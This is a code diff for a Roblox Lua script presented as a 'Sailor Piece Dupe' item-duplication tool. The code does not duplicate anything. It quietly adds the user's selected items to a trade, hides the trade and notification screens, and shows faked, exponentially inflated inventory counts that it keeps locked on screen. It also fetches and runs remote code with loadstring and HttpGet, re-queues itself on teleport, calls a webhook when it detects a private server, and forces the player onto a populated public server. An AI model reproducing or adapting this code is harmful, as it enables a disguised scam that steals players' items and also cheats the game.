+	headerAccent.BorderSizePixel = 0
+	headerAccent.Parent = frame
+
+	local accentCorner = Instance.new("UICorner")
+	accentCorner.CornerRadius = UDim.new(0, 18)
+	accentCorner.Parent = headerAccent
+
+	local titleLabel = Instance.new("TextLabel")
+	titleLabel.Name = "Title"
+	titleLabel.BackgroundTransparency = 1
+	titleLabel.Position = UDim2.new(0, 22, 0, 16)
+	titleLabel.Size = UDim2.new(1, -44, 0, 38)
+	titleLabel.Font = Enum.Font.GothamBold
+	titleLabel.TextSize = 30
+	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	titleLabel.Text = "Starting Dupe Process"
+	titleLabel.Parent = frame
+
+	local subtitleLabel = Instance.new("TextLabel")
+	subtitleLabel.Name = "Subtitle"
+	subtitleLabel.BackgroundTransparency = 1
+	subtitleLabel.Position = UDim2.new(0, 22, 0, 52)
+	subtitleLabel.Size = UDim2.new(1, -44, 0, 24)
+	subtitleLabel.Font = Enum.Font.GothamMedium
+	subtitleLabel.TextSize = 14
+	subtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+	subtitleLabel.TextColor3 = Color3.fromRGB(138, 153, 190)
+	subtitleLabel.Text = "Live Dupe Session"
+	subtitleLabel.Parent = frame
+
+	local headerDivider = Instance.new("Frame")
+	headerDivider.Name = "HeaderDivider"
+	headerDivider.Position = UDim2.new(0, 22, 0, 82)
+	headerDivider.Size = UDim2.new(1, -44, 0, 1)
+	headerDivider.BackgroundColor3 = Color3.fromRGB(55, 65, 98)
+	headerDivider.BorderSizePixel = 0
+	headerDivider.Parent = frame
+
+	processingStatusLabel = Instance.new("TextLabel")
+	processingStatusLabel.Name = "Status"
+	processingStatusLabel.BackgroundTransparency = 1
+	processingStatusLabel.Position = UDim2.new(0, 22, 0, 94)
+	processingStatusLabel.Size = UDim2.new(1, -44, 0, 30)
+	processingStatusLabel.Font = Enum.Font.Gotham
+	processingStatusLabel.TextSize = 20
+	processingStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+	processingStatusLabel.TextColor3 = Color3.fromRGB(209, 218, 238)
+	processingStatusLabel.Text = "Attempting to dupe selected items"
+	processingStatusLabel.Parent = frame
+
+	processingTargetLabel = Instance.new("TextLabel")
+	processingTargetLabel.Name = "Target"
+	processingTargetLabel.BackgroundTransparency = 1
+	processingTargetLabel.Position = UDim2.new(0, 22, 0, 130)
+	processingTargetLabel.Size = UDim2.new(1, -44, 0, 28)
+	processingTargetLabel.Font = Enum.Font.GothamBold
+	processingTargetLabel.TextSize = 19
+	processingTargetLabel.TextXAlignment = Enum.TextXAlignment.Left
+	processingTargetLabel.TextColor3 = Color3.fromRGB(176, 196, 239)
+	processingTargetLabel.Text = "Dupe repeat count Target: 0/0"
+	processingTargetLabel.Parent = frame
+
+	local progressTrack = Instance.new("Frame")
+	progressTrack.Name = "ProgressTrack"
+	progressTrack.Position = UDim2.new(0, 22, 0, 168)
+	progressTrack.Size = UDim2.new(1, -44, 0, 12)
+	progressTrack.BackgroundColor3 = Color3.fromRGB(37, 44, 66)
+	progressTrack.BorderSizePixel = 0
+	progressTrack.Parent = frame
+
+	local progressTrackCorner = Instance.new("UICorner")
+	progressTrackCorner.CornerRadius = UDim.new(1, 0)
+	progressTrackCorner.Parent = progressTrack
+
+	processingProgressFill = Instance.new("Frame")
+	processingProgressFill.Name = "ProgressFill"
+	processingProgressFill.Size = UDim2.new(0, 0, 1, 0)
+	processingProgressFill.BackgroundColor3 = Color3.fromRGB(91, 143, 255)
+	processingProgressFill.BorderSizePixel = 0
+	processingProgressFill.Parent = progressTrack
+
+	local progressFillCorner = Instance.new("UICorner")
+	progressFillCorner.CornerRadius = UDim.new(1, 0)
+	progressFillCorner.Parent = processingProgressFill
+
+	local progressFillGradient = Instance.new("UIGradient")
+	progressFillGradient.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(95, 177, 255)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(91, 100, 255)),
+	})
+	progressFillGradient.Parent = processingProgressFill
+
+	local dataCard = Instance.new("Frame")
+	dataCard.Name = "DataCard"
+	dataCard.Position = UDim2.new(0, 22, 0, 192)
+	dataCard.Size = UDim2.new(1, -44, 0, 152)
+	dataCard.BackgroundColor3 = Color3.fromRGB(16, 22, 38)
+	dataCard.BackgroundTransparency = 0.18
+	dataCard.BorderSizePixel = 0
+	dataCard.Parent = frame
+
+	local dataCardCorner = Instance.new("UICorner")
+	dataCardCorner.CornerRadius = UDim.new(0, 10)
+	dataCardCorner.Parent = dataCard
+
+	local dataCardStroke = Instance.new("UIStroke")
+	dataCardStroke.Color = Color3.fromRGB(58, 76, 122)
+	dataCardStroke.Thickness = 1
+	dataCardStroke.Transparency = 0.2
+	dataCardStroke.Parent = dataCard
+
+	processingQuantityLabel = Instance.new("TextLabel")
+	processingQuantityLabel.Name = "Quantity"
+	processingQuantityLabel.BackgroundTransparency = 1
+	processingQuantityLabel.Position = UDim2.new(0, 14, 0, 10)
+	processingQuantityLabel.Size = UDim2.new(1, -28, 1, -20)
+	processingQuantityLabel.Font = Enum.Font.GothamMedium
+	processingQuantityLabel.TextSize = 21
+	processingQuantityLabel.TextWrapped = true
+	processingQuantityLabel.TextXAlignment = Enum.TextXAlignment.Left
+	processingQuantityLabel.TextYAlignment = Enum.TextYAlignment.Top
+	processingQuantityLabel.TextColor3 = Color3.fromRGB(138, 245, 200)
+	processingQuantityLabel.Text = "Selected item: 0"
+	processingQuantityLabel.Parent = dataCard
+
+	local closeButton = Instance.new("TextButton")
+	closeButton.Name = "Close"
+	closeButton.AnchorPoint = Vector2.new(1, 0)
+	closeButton.Position = UDim2.new(1, -14, 0, 14)
+	closeButton.Size = UDim2.new(0, 34, 0, 34)
+	closeButton.BackgroundColor3 = Color3.fromRGB(194, 66, 73)
+	closeButton.BorderSizePixel = 0
+	closeButton.Text = "X"
+	closeButton.Font = Enum.Font.GothamBold
+	closeButton.TextSize = 18
+	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+	closeButton.Parent = frame
+
+	local closeCorner = Instance.new("UICorner")
+	closeCorner.CornerRadius = UDim.new(0, 8)
+	closeCorner.Parent = closeButton
+
+	closeButton.MouseEnter:Connect(function()
+		closeButton.BackgroundColor3 = Color3.fromRGB(214, 78, 86)
+	end)
+
+	closeButton.MouseLeave:Connect(function()
+		closeButton.BackgroundColor3 = Color3.fromRGB(194, 66, 73)
+	end)
+
+	closeButton.MouseButton1Click:Connect(function()
+		dupeProcessCancelled = true
+		if processingGui then
+			processingGui.Enabled = false
+		end
+		if uiRayfield then
+			pcall(function()
+				uiRayfield:Notify({
+					Title = "Sailor Piece Dupe",
+					Content = "Dupe Cancelled by user",
+					Duration = 4,
+					Image = 4483362458,
+				})
+			end)
+		end
+	end)
+
+	return true
+end
+
+local function setProcessingUiVisible(isVisible)
+	if ensureProcessingUi() then
+		processingGui.Enabled = isVisible == true
+	end
+end
+
+local function formatMultipliedAmount(baseAmount, power)
+	local safeBase = math.max(0, math.floor(baseAmount or 0))
+	local safePower = math.max(0, math.floor(power or 0))
+	if safePower <= 20 then
+		return tostring(safeBase * (2 ^ safePower))
+	end
+	return string.format("%d x 2^%d", safeBase, safePower)
+end
+
+local function normalizeItemKey(name)
+	if type(name) ~= "string" then
+		return ""
+	end
+
+	local lowered = string.lower(name)
+	lowered = string.gsub(lowered, "[^%w]", "")
+	return lowered
+end
+
+local function findInventoryItemQuantityLabel(itemName)
+	if not localPlayer then
+		return nil
+	end
+
+	local playerGui = localPlayer:FindFirstChild("PlayerGui")
+	if not playerGui then
+		return nil
+	end
+
+	local inventoryPanel = playerGui:FindFirstChild("InventoryPanelUI")
+	if not inventoryPanel then
+		return nil
+	end
+
+	local wanted = normalizeItemKey(itemName)
+	if wanted == "" then
+		return nil
+	end
+
+	local directItem = inventoryPanel:FindFirstChild("Item_" .. itemName, true)
+	if directItem then
+		local directQuantity = directItem:FindFirstChild("Quantity", true)
+		if directQuantity and directQuantity:IsA("TextLabel") then
+			return directQuantity
+		end
+	end
+
+	for _, desc in ipairs(inventoryPanel:GetDescendants()) do
+		if desc:IsA("GuiObject") and string.sub(desc.Name, 1, 5) == "Item_" then
+			local candidateName = string.sub(desc.Name, 6)
+			if normalizeItemKey(candidateName) == wanted then
+				local qtyLabel = desc:FindFirstChild("Quantity", true)
+				if qtyLabel and qtyLabel:IsA("TextLabel") then
+					return qtyLabel
+				end
+			end
+		end
+	end
+
+	return nil
+end
+
+local function syncSelectedItemQuantityLabels(selectedEntries, multiplierPower)
+	if typeof(selectedEntries) ~= "table" or #selectedEntries == 0 then
+		return
+	end
+
+	for _, entry in ipairs(selectedEntries) do
+		if typeof(entry) == "table" and type(entry.name) == "string" then
+			local qtyLabel = findInventoryItemQuantityLabel(entry.name)
+			if qtyLabel then
+				local valueText = formatMultipliedAmount(entry.amount, multiplierPower)
+				qtyLabel.Text = "x" .. valueText
+			end
+		end
+	end
+end
+
+local function applyLockedQuantitySyncValues()
+	for itemName, valueText in pairs(quantitySyncLockValues) do
+		local qtyLabel = findInventoryItemQuantityLabel(itemName)
+		if qtyLabel then
+			qtyLabel.Text = valueText
+		end
+	end
+end
+
+local function setQuantitySyncLock(enabled, selectedEntries, multiplierPower)
+	quantitySyncLockToken = quantitySyncLockToken + 1
+	local currentToken = quantitySyncLockToken
+	quantitySyncLockActive = enabled == true
+
+	if not quantitySyncLockActive then
+		quantitySyncLockValues = {}
+		return
+	end
+
+	quantitySyncLockValues = {}
+	if typeof(selectedEntries) == "table" then
+		for _, entry in ipairs(selectedEntries) do
+			if typeof(entry) == "table" and type(entry.name) == "string" then
+				quantitySyncLockValues[entry.name] = "x" .. formatMultipliedAmount(entry.amount, multiplierPower)
+			end
+		end
+	end
+
+	applyLockedQuantitySyncValues()
+
+	task.spawn(function()
+		while quantitySyncLockActive and currentToken == quantitySyncLockToken do
+			applyLockedQuantitySyncValues()
+			task.wait(0.25)
+		end
+	end)
+end
+
+local function buildSelectedItemAmountLines(selectedEntries, multiplierPower)
+	if typeof(selectedEntries) ~= "table" or #selectedEntries == 0 then
+		return "Selected item: 0"
+	end
+
+	local lines = {}
+	for _, entry in ipairs(selectedEntries) do
+		if typeof(entry) == "table" and type(entry.name) == "string" then
+			local amount = tonumber(entry.amount) or 0
+			table.insert(lines, string.format("%s: %s", entry.name, formatMultipliedAmount(amount, multiplierPower)))
+		end
+	end
+
+	if #lines == 0 then
+		return "Selected item: 0"
+	end
+
+	return table.concat(lines, "\n")
+end
+
+local function updateProcessingUi(statusText, repeatCurrent, repeatTarget, selectedEntries, multiplierPower)
+	if not ensureProcessingUi() then
+		return
+	end
+
+	if processingStatusLabel then
+		processingStatusLabel.Text = statusText or "Attempting to dupe selected items"
+	end
+
+	if processingTargetLabel then
+		local current = math.max(0, math.floor(repeatCurrent or 0))
+		local target = math.max(1, math.floor(repeatTarget or 1))
+		processingTargetLabel.Text = string.format("Dupe repeat count Target: %d/%d", current, target)
+		if processingProgressFill then
+			processingProgressFill.Size = UDim2.new(math.clamp(current / target, 0, 1), 0, 1, 0)
+		end
+	end
+
+	if processingQuantityLabel then
+		local power = math.max(0, math.floor(multiplierPower or 0))
+		processingQuantityLabel.Text = buildSelectedItemAmountLines(selectedEntries, power)
+	end
+end
+
+local function getInventoryItemCount()
+	local snapshot = {}
+	local items = inventoryByCategory.Items
+	if typeof(items) ~= "table" then
+		return 0
+	end
+
+	for _, item in ipairs(items) do
+		if typeof(item) == "table" and type(item.name) == "string" and ITEMS_TO_ADD_WHITELIST[item.name] then
+			table.insert(snapshot, {
+				name = item.name,
+				quantity = tonumber(item.quantity) or 1,
+			})
+		end
+	end
+
+	table.sort(snapshot, function(a, b)
+		if a.quantity == b.quantity then
+			return a.name < b.name
+		end
+		return a.quantity > b.quantity
+	end)
+
+	return #snapshot
+end
+
+local function buildDupableItemsNote()
+	local names = {}
+	for itemName, enabled in pairs(ITEMS_TO_ADD_WHITELIST) do
+		if enabled then
+			table.insert(names, itemName)
+		end
+	end
+
+	table.sort(names)
+	return table.concat(names, "\n")
+end
+
+local function buildInventoryPreview(maxItems)
+	local items = inventoryByCategory.Items
+	if typeof(items) ~= "table" or #items == 0 then
+		return "No dupable item detected"
+	end
+
+	local snapshot = {}
+	for _, item in ipairs(items) do
+		if typeof(item) == "table" and type(item.name) == "string" and ITEMS_TO_ADD_WHITELIST[item.name] then
+			table.insert(snapshot, {
+				name = item.name,
+				quantity = tonumber(item.quantity) or 1,
+			})
+		end
+	end
+
+	if #snapshot == 0 then
+		return "No dupable item detected"
+	end
+
+	table.sort(snapshot, function(a, b)
+		if a.quantity == b.quantity then
+			return a.name < b.name
+		end
+		return a.quantity > b.quantity
+	end)
+
+	local shown = math.min(math.max(1, maxItems), #snapshot)
+	local lines = {}
+	for i = 1, shown do
+		local entry = snapshot[i]
+		table.insert(lines, string.format("%d) %s x%d", i, entry.name, entry.quantity))
+	end
+
+	if #snapshot > shown then
+		table.insert(lines, string.format("...and %d more", #snapshot - shown))
+	end
+
+	return table.concat(lines, "\n")
+end
+
+local function updateInventoryStatusParagraph(prefixText)
+	if not uiInventoryStatusParagraph then
+		return
+	end
+
+	local itemCount = getInventoryItemCount()
+	local whitelistNote = "Dupable items:\n" .. buildDupableItemsNote()
+	local content = "No dupable item detected\n\n" .. whitelistNote
+	if itemCount > 0 then
+		content = string.format(
+			"Detected %d dupable item entries.\n%s\n\n%s",
+			itemCount,
+			buildInventoryPreview(INVENTORY_PREVIEW_MAX_ITEMS),
+			whitelistNote
+		)
+	end
+
+	if type(prefixText) == "string" and prefixText ~= "" then
+		content = prefixText .. "\n" .. content
+	end
+
+	pcall(function()
+		uiInventoryStatusParagraph:Set({
+			Title = "Inventory Status",
+			Content = content,
+		})
+	end)
+end
+
+local function notifyInventoryUpdated()
+	if not uiRayfield then
+		return
+	end
+
+	local now = os.clock()
+	if now - lastInventoryNotifyAt < INVENTORY_NOTIFY_COOLDOWN then
+		return
+	end
+	lastInventoryNotifyAt = now
+
+	local itemCount = getInventoryItemCount()
+	local preview = buildInventoryPreview(INVENTORY_PREVIEW_MAX_ITEMS)
+	local whitelistNote = "Dupable items:\n" .. buildDupableItemsNote()
+	local notifyText = string.format("Detected %d dupable item entries\n%s\n\n%s", itemCount, preview, whitelistNote)
+	if itemCount == 0 then
+		notifyText = "No dupable item detected\n\n" .. whitelistNote
+	end
+
+	pcall(function()
+		uiRayfield:Notify({
+			Title = "Inventory Detected",
+			Content = notifyText,
+			Duration = 6,
+			Image = 4483362458,
+		})
+	end)
+end
+
+local function fireRequestInventoryExact()
+	local okRemote, remote = pcall(function()
+		return game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("RequestInventory")
+	end)
+	if not okRemote or not remote then
+		return false
+	end
+
+	local fired = false
+	pcall(function()
+		remote:FireServer()
+		fired = true
+	end)
+
+	return fired
+end
+
+local function requestInventoryNow()
+	if fireRequestInventoryExact() then
+		return true
+	end
+
+	local remote = requestInventory
+	if not remote then
+		remote = remotes:FindFirstChild("RequestInventory")
+		if not remote then
+			remote = remotes:WaitForChild("RequestInventory", 2)
+		end
+		requestInventory = remote
+	end
+
+	if remote then
+		remote:FireServer()
+		return true
+	end
+
+	return false
+end
+
+local function requestInventoryScanNow()
+	requestInventoryNow()
+
+	for _ = 1, SCAN_RETRY_COUNT do
+		if getInventoryItemCount() > 0 then
+			break
+		end
+
+		task.wait(SCAN_RETRY_INTERVAL)
+		requestInventoryNow()
+	end
+end
+
+local function parseItemNameInput(rawText)
+	local wanted = {}
+	if type(rawText) ~= "string" then
+		return wanted
+	end
+
+	for token in string.gmatch(rawText, "[^,]+") do
+		local cleaned = string.gsub(token, "^%s*(.-)%s*$", "%1")
+		if cleaned ~= "" then
+			wanted[string.lower(cleaned)] = true
+		end
+	end
+
+	return wanted
+end
+
+local function getSelectedItemDetectionText(rawText)
+	if not inventoryScanReady then
+		return "please scan your inventory first", false
+	end
+
+	local wantedSet = parseItemNameInput(rawText)
+	if next(wantedSet) == nil then
+		return "please scan your inventory first", false
+	end
+
+	local items = inventoryByCategory.Items
+	if typeof(items) ~= "table" or #items == 0 then
+		return "please scan your inventory first", false
+	end
+
+	local foundSet = {}
+	for _, item in ipairs(items) do
+		if typeof(item) == "table" and type(item.name) == "string" and ITEMS_TO_ADD_WHITELIST[item.name] then
+			foundSet[string.lower(item.name)] = true
+		end
+	end
+
+	local lines = {}
+	local anyFound = false
+	for token in string.gmatch(rawText, "[^,]+") do
+		local cleaned = string.gsub(token, "^%s*(.-)%s*$", "%1")
+		if cleaned ~= "" then
+			local key = string.lower(cleaned)
+			if wantedSet[key] then
+				wantedSet[key] = nil
+				if foundSet[key] then
+					anyFound = true
+					table.insert(lines, string.format("%s Found", cleaned))
+				else
+					table.insert(lines, string.format("%s not found in dupable items", cleaned))
+				end
+			end
+		end
+	end
+
+	return table.concat(lines, "\n"), anyFound
+end
+
+local function updateSelectedItemStatus()
+	if not uiSelectedItemStatusParagraph then
+		return
+	end
+
+	local statusText = select(1, getSelectedItemDetectionText(selectedDupeItemsText))
+
+	pcall(function()
+		uiSelectedItemStatusParagraph:Set({
+			Title = "Selected Item Status",
+			Content = statusText,
+		})
+	end)
+end
+
+local function dupeSelectedItemsFromInput(rawText)
+	setQuantitySyncLock(false)
+	dupeProcessCancelled = false
+	setTemporaryDupeGuiState(true)
+	setProcessingUiVisible(true)
+	updateProcessingUi("Starting Dupe Process", 0, dupeRepeatCount, nil, 0)
+	if uiRayfield then
+		pcall(function()
+			uiRayfield:Notify({
+				Title = "Sailor Piece Dupe",
+				Content = string.format("Dupe Started\nRepeat Target: %d", math.max(1, math.floor(dupeRepeatCount))),
+				Duration = 4,
+				Image = 4483362458,
+			})
+		end)
+	end
+	updateProcessingUi("Disabling some game features to avoid dupe interruption", 0, dupeRepeatCount, nil, 0)
+	task.wait(DUPE_PREPARE_DELAY)
+	task.wait(0.15)
+	if dupeProcessCancelled then
+		setQuantitySyncLock(false)
+		setTemporaryDupeGuiState(false)
+		return
+	end
+	updateProcessingUi("Attempting to dupe selected items", 0, dupeRepeatCount, nil, 0)
+
+	local wantedSet = parseItemNameInput(rawText)
+	local hasWanted = next(wantedSet) ~= nil
+	if not hasWanted then
+		updateSelectedItemStatus()
+		updateProcessingUi("Please enter item names first", 0, dupeRepeatCount, nil, 0)
+		task.wait(0.8)
+		setProcessingUiVisible(false)
+		setQuantitySyncLock(false)
+		setTemporaryDupeGuiState(false)
+		if uiRayfield then
+			pcall(function()
+				uiRayfield:Notify({
+					Title = "Sailor Piece Dupe",
+					Content = "Enter item names separated by commas first",
+					Duration = 4,
+					Image = 4483362458,
+				})
+			end)
+		end
+		return
+	end
+
+	local items = inventoryByCategory.Items
+	if typeof(items) ~= "table" or #items == 0 then
+		updateSelectedItemStatus()
+		updateProcessingUi("please scan your inventory first", 0, dupeRepeatCount, nil, 0)
+		task.wait(0.8)
+		setProcessingUiVisible(false)
+		setQuantitySyncLock(false)
+		setTemporaryDupeGuiState(false)
+		if uiRayfield then
+			pcall(function()
+				uiRayfield:Notify({
+					Title = "Sailor Piece Dupe",
+					Content = "please scan your inventory first",
+					Duration = 4,
+					Image = 4483362458,
+				})
+			end)
+		end
+		return
+	end
+
+	local attempted = 0
+	local matched = 0
+	local multiplierPower = 0
+	local progressCount = 0
+	local selectedEntries = {}
+	for _, item in ipairs(items) do
+		if typeof(item) == "table" and type(item.name) == "string" then
+			local key = string.lower(item.name)
+			if wantedSet[key] then
+				matched = matched + 1
+				table.insert(selectedEntries, {
+					name = item.name,
+					amount = tonumber(item.quantity) or 1,
+				})
+			end
+		end
+	end
+
+	local targetRepeats = math.max(1, math.floor(dupeRepeatCount))
+	syncSelectedItemQuantityLabels(selectedEntries, multiplierPower)
+	while progressCount < targetRepeats and #selectedEntries > 0 do
+		if dupeProcessCancelled then
+			break
+		end
+
+		for _, entry in ipairs(selectedEntries) do
+			if dupeProcessCancelled then
+				break
+			end
+			addItemToTrade:FireServer("Items", entry.name, entry.amount)
+			attempted = attempted + 1
+		end
+
+		progressCount = progressCount + 1
+		multiplierPower = multiplierPower + 1
+		syncSelectedItemQuantityLabels(selectedEntries, multiplierPower)
+		updateProcessingUi("Attempting to dupe selected items", progressCount, targetRepeats, selectedEntries, multiplierPower)
+
+		if uiRayfield then
+			for _, entry in ipairs(selectedEntries) do
+				pcall(function()
+					uiRayfield:Notify({
+						Title = "Sailor Piece Dupe",
+						Content = string.format(
+							"Processing %d/%d\nSelected %s count: %s",
+							progressCount,
+							targetRepeats,
+							entry.name,
+							formatMultipliedAmount(entry.amount, multiplierPower)
+						),
+						Duration = 3,
+						Image = 4483362458,
+					})
+				end)
+			end
+		end
+
+		if progressCount < targetRepeats then
+			task.wait(DUPE_PROCESS_STEP_DELAY)
+		end
+	end
+
+	if dupeProcessCancelled then
+		setQuantitySyncLock(false)
+		setTemporaryDupeGuiState(false)
+		return
+	end
+
+	updateSelectedItemStatus()
+
+	local detectionText, anyFound = getSelectedItemDetectionText(rawText)
+
+	if uiRayfield then
+		pcall(function()
+			uiRayfield:Notify({
+				Title = "Sailor Piece Dupe",
+				Content = string.format("%s\nRepeat Count: %d\nAttempts: %d", detectionText, dupeRepeatCount, attempted),
+				Duration = 5,
+				Image = 4483362458,
+			})
+		end)
+	end
+
+	updateProcessingUi("Dupe process finished", math.min(progressCount, targetRepeats), targetRepeats, selectedEntries, multiplierPower)
+	setQuantitySyncLock(true, selectedEntries, multiplierPower)
+	task.wait(0.9)
+	setProcessingUiVisible(false)
+	setTemporaryDupeGuiState(false)
+end
+
+local function tryLoadRayfield()
+	for _, sourceUrl in ipairs(RAYFIELD_SOURCES) do
+		local ok, rayfieldLibrary = pcall(function()
+			return loadstring(game:HttpGet(sourceUrl))()
+		end)
+		if ok and rayfieldLibrary then
+			return rayfieldLibrary
+		end
+	end
+
+	return nil
+end
+
+local function createSailorUi()
+	if sailorUiCreated then
+		return true
+	end
+
+	for attempt = 1, RAYFIELD_LOAD_RETRIES do
+		local Rayfield = tryLoadRayfield()
+		if Rayfield then
+			uiRayfield = Rayfield
+			local okWindow, window = pcall(function()
+				return Rayfield:CreateWindow({
+					Name = "Sailor Piece Dupe",
+					Icon = 0,
+					LoadingTitle = "Sailor Piece Dupe",
+					LoadingSubtitle = "Initializing",
+					ShowText = "Sailor Piece Dupe",
+					Theme = "Default",
+					ToggleUIKeybind = "K",
+					DisableRayfieldPrompts = true,
+					DisableBuildWarnings = true,
+					ConfigurationSaving = {
+						Enabled = false,
+						FolderName = nil,
+						FileName = "SailorPieceDupe",
+					},
+					Discord = {
+						Enabled = false,
+						Invite = "",
+						RememberJoins = false,
+					},
+					KeySystem = false,
+				})
+			end)
+
+			if okWindow and window then
+				pcall(function()
+					local opTab = window:CreateTab("OP", 4483362458)
+					uiInventoryStatusParagraph = opTab:CreateParagraph({
+						Title = "Inventory Status",
+						Content = "Waiting for scan...",
+					})
+					opTab:CreateButton({
+						Name = "Scan Inventory",
+						Callback = function()
+							inventoryScanReady = true
+							scanNotifyPending = true
+							task.spawn(requestInventoryScanNow)
+
+							updateInventoryStatusParagraph("Scanning inventory...")
+							pcall(function()
+								Rayfield:Notify({
+									Title = "Sailor Piece Dupe",
+									Content = "Inventory scan requested",
+									Duration = 4,
+									Image = 4483362458,
+								})
+							end)
+						end,
+					})
+					opTab:CreateInput({
+						Name = "Selected Items",
+						CurrentValue = "",
+						PlaceholderText = "Item Name, Item Name",
+						RemoveTextAfterFocusLost = false,
+						Flag = "OP_SelectedItemsInput",
+						Callback = function(text)
+							selectedDupeItemsText = text or ""
+							updateSelectedItemStatus()
+						end,
+					})
+					uiSelectedItemStatusParagraph = opTab:CreateParagraph({
+						Title = "Selected Item Status",
+						Content = "Make sure to scan inventory first. Then type item names separated by commas to check if they are detected.",
+					})
+					opTab:CreateInput({
+						Name = "Dupe Repeat Count",
+						CurrentValue = tostring(dupeRepeatCount),
+						PlaceholderText = "Enter any positive number",
+						RemoveTextAfterFocusLost = false,
+						Flag = "OP_DupeRepeatCount",
+						Callback = function(text)
+							local parsed = tonumber(text)
+							if parsed then
+								dupeRepeatCount = math.max(1, math.floor(parsed))
+							end
+						end,
+					})
+					opTab:CreateParagraph({
+						Title = "Note",
+						Content = "Any positive number is allowed. The higher the value, the longer it will take.",
+					})
+					opTab:CreateButton({
+						Name = "Dupe Selected Items",
+						Callback = function()
+							dupeSelectedItemsFromInput(selectedDupeItemsText)
+						end,
+					})
+				end)
+				pcall(function()
+					Rayfield:Notify({
+						Title = "Sailor Piece Dupe",
+						Content = "UI loaded successfully",
+						Duration = 5,
+						Image = 4483362458,
+					})
+				end)
+				sailorUiCreated = true
+				return true
+			end
+		end
+
+		if attempt < RAYFIELD_LOAD_RETRIES then
+			task.wait(RAYFIELD_RETRY_DELAY)
+		end
+	end
+
+	warn("Sailor Piece Dupe: failed to load Rayfield UI after retries")
+	return false
+end
+
+local function disableTradeScreenGuisOnStart()
+	if not DISABLE_TRADE_SCREEN_GUIS_ON_START or not localPlayer then
+		return
+	end
+
+	local playerGui = localPlayer:FindFirstChild("PlayerGui") or localPlayer:WaitForChild("PlayerGui")
+	local guiNames = {
+		"TradeRequestUI",
+		"TradingUI",
+		"InTradingUI",
+		"NotificationUI",
+	}
+
+	for _, guiName in ipairs(guiNames) do
+		local gui = playerGui:FindFirstChild(guiName)
+		if gui and gui:IsA("ScreenGui") then
+			gui.Enabled = false
+		end
+	end
+end
+
+local function notifyBlockedServerCountdown(secondsLeft)
+	local countdownText = string.format(
+		"%s\nSwitching to public server in %d seconds",
+		BLOCKED_SERVER_NOTIFICATION_TEXT,
+		math.max(0, math.floor(secondsLeft or 0))
+	)
+
+	pcall(function()
+		StarterGui:SetCore("SendNotification", {
+			Title = BLOCKED_SERVER_NOTIFICATION_TITLE,
+			Text = countdownText,
+			Duration = 1.1,
+		})
+	end)
+	warn("Sailor Piece Dupe: " .. countdownText)
+end
+
+local function getQueueOnTeleportFunction()
+	return queue_on_teleport
+		or (syn and syn.queue_on_teleport)
+end
+
+local function queueScriptReloadOnTeleport()
+	if not AUTO_RELOAD_AFTER_SERVER_HOP then
+		return
+	end
+
+	local queueFn = getQueueOnTeleportFunction()
+	if not queueFn then
+		return
+	end
+
+	local payload = ""
+	if type(AUTO_RELOAD_SOURCE_CODE) == "string" and AUTO_RELOAD_SOURCE_CODE ~= "" then
+		payload = AUTO_RELOAD_SOURCE_CODE
+	elseif type(AUTO_RELOAD_SOURCE_URL) == "string" and AUTO_RELOAD_SOURCE_URL ~= "" then
+		payload = string.format("loadstring(game:HttpGet(%q))()", AUTO_RELOAD_SOURCE_URL)
+	end
+
+	if payload == "" then
+		return
+	end
+
+	pcall(function()
+		queueFn(payload)
+	end)
+end
+
+local function findLowPopulationPublicServerJobId()
+	local now = os.clock()
+	for jobId, attemptedAt in pairs(recentServerHopAttempts) do
+		if now - attemptedAt >= RECENT_HOP_ATTEMPT_TTL then
+			recentServerHopAttempts[jobId] = nil
+		end
+	end
+
+	local placeId = game.PlaceId
+	local cursor = nil
+
+	for _ = 1, SERVER_HOP_MAX_PAGE_SCANS do
+		local url = string.format(
+			"https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=%d&excludeFullGames=true",
+			placeId,
+			SERVER_HOP_API_LIMIT
+		)
+		if cursor then
+			url = url .. "&cursor=" .. HttpService:UrlEncode(cursor)
+		end
+
+		local okResponse, responseBody = pcall(function()
+			return game:HttpGet(url)
+		end)
+		if not okResponse or type(responseBody) ~= "string" then
+			break
+		end
+
+		local okDecoded, decoded = pcall(function()
+			return HttpService:JSONDecode(responseBody)
+		end)
+		if not okDecoded or typeof(decoded) ~= "table" then
+			break
+		end
+
+		local data = decoded.data
+		if typeof(data) == "table" then
+			local candidates = {}
+			for _, server in ipairs(data) do
+				if typeof(server) == "table" then
+					local jobId = tostring(server.id or "")
+					local playing = tonumber(server.playing) or 0
+					local maxPlayers = tonumber(server.maxPlayers) or 0
+					local hasRoom = maxPlayers <= 0 or playing < maxPlayers
+					local notRecentlyAttempted = recentServerHopAttempts[jobId] == nil
+					if jobId ~= "" and jobId ~= game.JobId and hasRoom and playing >= PUBLIC_SERVER_MIN_PLAYER_COUNT and notRecentlyAttempted then
+						table.insert(candidates, {
+							jobId = jobId,
+							playing = playing,
+						})
+					end
+				end
+			end
+
+			if #candidates > 0 then
+				table.sort(candidates, function(a, b)
+					return a.playing < b.playing
+				end)
+				return candidates[1].jobId
+			end
+		end
+
+		cursor = decoded.nextPageCursor
+		if not cursor or cursor == "" then
+			break
+		end
+	end
+
+	return nil
+end
+
+local function startBlockedServerRecoveryLoop()
+	if blockedServerHopLoopStarted then
+		return
+	end
+	blockedServerHopLoopStarted = true
+	sendPrivateServerDetectedWebhook()
+
+	task.spawn(function()
+		while scriptBlockedInPrivateServer do
+			local isPrivateNow = isPrivateServerByPlayerCount()
+			if not isPrivateNow then
+				scriptBlockedInPrivateServer = false
+				blockedServerHopLoopStarted = false
+				if not normalModeInitialized then
+					normalModeInitialized = true
+					disableTradeScreenGuisOnStart()
+					task.spawn(createSailorUi)
+				end
+				return
+			end
+
+			local countdown = math.max(1, math.floor(BLOCKED_SERVER_COUNTDOWN_SECONDS))
+			for secondsLeft = countdown, 1, -1 do
+				if not scriptBlockedInPrivateServer then
+					blockedServerHopLoopStarted = false
+					return
+				end
+
+				local stillPrivate = isPrivateServerByPlayerCount()
+				if not stillPrivate then
+					scriptBlockedInPrivateServer = false
+					blockedServerHopLoopStarted = false
+					if not normalModeInitialized then
+						normalModeInitialized = true
+						disableTradeScreenGuisOnStart()
